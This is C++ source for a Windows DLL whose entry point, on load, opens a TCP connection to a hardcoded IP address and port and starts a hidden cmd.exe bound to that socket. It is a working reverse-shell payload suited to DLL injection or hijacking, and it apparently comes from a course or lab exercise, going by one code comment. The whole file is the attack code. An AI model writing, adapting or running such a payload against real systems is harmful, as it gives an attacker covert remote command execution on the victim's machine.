// dllmain.cpp : Defines the entry point for the DLL application.

#include <winsock2.h>
#include "windows.h"
#include <stdio.h>
#pragma comment(lib, "ws2_32")

#define HOST "192.168.253.17"
#define PORT 2600


WSADATA wsdata;
SOCKET wsock;
SOCKET Sock;
struct sockaddr_in dest;
char ip_addr[16];
STARTUPINFOA ini_process;
PROCESS_INFORMATION process_info;

void startShell() {

	//pretty much copied from your example, windows programming is dumb
	//Added check to make sure socket was established before starting shell
	WSAStartup(0x0101, &wsdata);
	wsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


	// Populate dest with relevant data.
	dest.sin_family = AF_INET;  //AF = Address Family, INET = Internet
	dest.sin_addr.s_addr = inet_addr(HOST); //helps with Endianness
	dest.sin_port = htons(PORT); //helps with Endianness

	if (WSAConnect(wsock, (SOCKADDR*)&dest, sizeof(dest), NULL, NULL, NULL, NULL) != 0)
		return;

	memset(&ini_process, 0, sizeof(ini_process));
	ini_process.cb = sizeof(ini_process);
	ini_process.dwFlags = STARTF_USESTDHANDLES;
	ini_process.wShowWindow = SW_HIDE;
	//ini_process.CreateNoWindow = 1;
	ini_process.hStdInput = ini_process.hStdOutput = ini_process.hStdError = (HANDLE)wsock;

	CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &ini_process, &process_info);

}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		startShell();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

